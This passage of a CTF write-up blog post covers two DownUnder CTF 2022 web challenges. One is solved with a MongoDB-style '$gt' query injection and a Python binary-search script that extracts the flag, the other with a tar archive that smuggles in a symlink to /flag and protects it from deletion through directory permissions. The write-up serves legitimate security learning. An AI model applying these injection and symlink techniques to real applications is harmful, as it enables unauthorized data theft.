+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Note Id has problem"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isLoggedIn</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Invalid request'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"this is from the exception"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isLoggedIn</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Invalid request'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>At least <code>req.query</code> could be leveraged!!</p>
+<p>We can set different content to brute force/guessing the content</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"noteId"</span><span class="token operator">:</span><span class="token number">1337</span><span class="token punctuation">,</span>
+  <span class="token property">"content"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+    <span class="token property">"$gt"</span><span class="token operator">:</span>'a'
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Here’s the solution. Of course, burpsuite intruder is another choice.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> Session
+<span class="token keyword">from</span> random <span class="token keyword">import</span> randint
+<span class="token keyword">from</span> string <span class="token keyword">import</span> printable
+
+charset <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>printable<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+
+
+<span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/register'</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+
+<span class="token comment"># returns True if the note exists</span>
+<span class="token keyword">def</span> <span class="token function">oracle</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/edit?noteId=1337&amp;contents[$gt]=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'You are not the owner of this note!'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text
+
+
+url <span class="token operator">=</span> <span class="token string">'https://web-noteworthy-873b7c844f49.2022.ductf.dev'</span>
+session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+register_user<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'solve-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token string">'solve'</span><span class="token punctuation">)</span>
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">while</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
+    l <span class="token operator">=</span> <span class="token number">0</span>
+    u <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        m <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> u<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+
+        candidate <span class="token operator">=</span> flag <span class="token operator">+</span> charset<span class="token punctuation">[</span>m<span class="token punctuation">]</span>
+        <span class="token keyword">if</span> oracle<span class="token punctuation">(</span>candidate<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> oracle<span class="token punctuation">(</span>flag <span class="token operator">+</span> charset<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">if</span> charset<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
+                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> charset<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                    flag <span class="token operator">=</span> candidate
+                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+            l <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            u <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926131752.png" loading="lazy"></p>
+<h2 id="no-symlink-Symlink-and-file-permission-trick"><a href="#no-symlink-Symlink-and-file-permission-trick" class="headerlink" title="no-symlink(Symlink and file permission trick)"></a>no-symlink(Symlink and file permission trick)</h2><p>The website allows us to upload a tar file, and it will extract the file.</p>
+<p>The difficulty is that it detects the symlink files and delete all.</p>
+<p>How do we bypass it?</p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">post <span class="token string-literal"><span class="token string">'/'</span></span> <span class="token keyword">do</span>
+  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:tarfile</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>tempfile <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token symbol">:tarfile</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token symbol">:tempfile</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> err <span class="token string-literal"><span class="token string">"File not sent"</span></span>
+  <span class="token keyword">end</span>
+  <span class="token keyword">unless</span> tempfile<span class="token punctuation">.</span>size <span class="token operator">&lt;=</span> <span class="token number">10240</span>
+    <span class="token keyword">return</span> err <span class="token string-literal"><span class="token string">"File too big"</span></span>
+  <span class="token keyword">end</span> 
+  
+  path <span class="token operator">=</span> SecureRandom<span class="token punctuation">.</span>hex <span class="token number">16</span>
+  <span class="token keyword">unless</span> <span class="token builtin">Dir</span><span class="token punctuation">.</span>mkdir <span class="token string-literal"><span class="token string">"uploads/</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">path</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">0755</span>
+    <span class="token keyword">return</span> err <span class="token string-literal"><span class="token string">"Error creating directory"</span></span>
+  <span class="token keyword">end</span>
+  <span class="token keyword">unless</span> system <span class="token string-literal"><span class="token string">"tar -xvf </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">tempfile<span class="token punctuation">.</span>path</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> -C uploads/</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">path</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> err <span class="token string-literal"><span class="token string">"Error extracting tar file"</span></span>
+  <span class="token keyword">end</span>
+
+  links <span class="token operator">=</span> <span class="token builtin">Dir</span><span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"uploads/</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">path</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">/**/*"</span></span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token double-colon punctuation">::</span><span class="token constant">FNM_DOTMATCH</span><span class="token punctuation">)</span><span class="token punctuation">.</span>select <span class="token keyword">do</span> <span class="token operator">|</span>f<span class="token operator">|</span>
+    <span class="token comment"># Don't show . or ..</span>
+    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"."</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">".."</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span> <span class="token builtin">File</span><span class="token punctuation">.</span>basename f
+      <span class="token boolean">false</span>
+    <span class="token comment"># Don't show symlinks. Additionally delete them, they may be unsafe</span>
+    <span class="token keyword">elsif</span> <span class="token builtin">File</span><span class="token punctuation">.</span>symlink<span class="token operator">?</span> f
+      <span class="token builtin">File</span><span class="token punctuation">.</span>unlink f
+      <span class="token boolean">false</span>
+    <span class="token comment"># Don't show directories (but show files under them)</span>
+    <span class="token keyword">elsif</span> <span class="token builtin">File</span><span class="token punctuation">.</span>directory<span class="token operator">?</span> f
+      <span class="token boolean">false</span>
+    <span class="token comment"># Show everything else</span>
+    <span class="token keyword">else</span>
+      <span class="token boolean">true</span>
+    <span class="token keyword">end</span>
+  <span class="token keyword">end</span>
+
+  <span class="token keyword">return</span> ok links
+<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Solution:</strong> </p>
+<p>Create a random text file(or any other files) for just getting the uploaded path(since the symlink will not be shown on the page)</p>
+<p>Create a directory <code>flagDir </code> and in the directory, generate a symlink: <code>ln -s /flag flag</code> -&gt; generate a symlink for <code>/flag</code></p>
+<p>Set up file permission(100 -&gt; read only) for the directory so that it cannot be deleted.</p>
+<p>Zip all the files: <code>tar -zcvf flag.tar flagDir/  </code></p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Leihehe</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/" title="DownUnder CTF 2022 writeup">https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/08/21/Rancher-resolved-issues/" rel="next" title="Rancher Resolved Issues"><span class="post-nav-text">Rancher Resolved Issues</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>说点什么好呢？</span><br></div><style>.utterances {
+  max-width: 100%;
+}</style><script src="https://utteranc.es/client.js" repo="leihehehe/leihehehe.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Leihehe</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div id="local-search-result"></div></div></div></body></html>
